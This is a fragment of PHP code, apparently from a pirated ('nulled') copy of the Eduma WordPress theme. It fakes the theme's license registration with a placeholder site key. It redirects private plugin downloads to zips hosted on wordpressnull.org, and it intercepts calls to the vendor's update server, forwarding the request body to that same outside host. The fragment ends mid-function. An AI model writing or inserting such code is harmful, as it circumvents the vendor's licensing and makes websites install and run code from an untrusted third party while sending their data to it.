...
const THIM_THEME_VERSION = '5.7.2';

update_site_option('thim_core_product_registration_themes', [
    'eduma' => [
        'site_key' => '**********'
    ]
]);
...
add_filter( 'thim_core_url_download_private_plugin', function( $source, $plugin ) {
    return 'https://wordpressnull.org/eduma/plugins/' . $plugin->get_slug() . '.zip';
}, 20, 2 );


add_filter('pre_http_request', function ($preempt, $r, $url) {
    if ($url === 'https://updates.thimpress.com/wp-json/thim_em/v1/thim-kit/import-library') {
        $post_data = $r['body'];
        $response = wp_remote_post('https://wordpressnull.org/eduma.php', [
            'body' => $post_data,
        ]);
